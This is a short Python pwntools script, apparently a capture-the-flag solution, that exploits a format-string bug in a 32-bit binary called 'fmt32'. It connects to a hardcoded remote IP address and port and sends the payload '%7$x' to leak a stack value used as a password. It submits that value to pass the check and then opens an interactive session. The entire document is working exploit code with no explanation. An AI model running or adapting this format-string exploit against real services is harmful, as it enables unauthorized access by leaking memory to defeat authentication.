from pwn import *
import time
context.binary = ELF('./fmt32')
context.log_level = 'debug'
elf = context.binary
libc = elf.libc

def dbg():
	gdb.attach(p, 'b* 0x80487d0')
	raw_input()


key = 0x804a06c

#p = process('./fmt32')
p = remote('47.106.94.13', 50009)
#dbg()

leak_key = '%7$x'

p.sendlineafter('name:', leak_key)
p.recvuntil('hello,')
passwd = int(p.recvline().strip('\n'), 16)

p.sendlineafter('number:', str(passwd))

p.interactive()
p.close()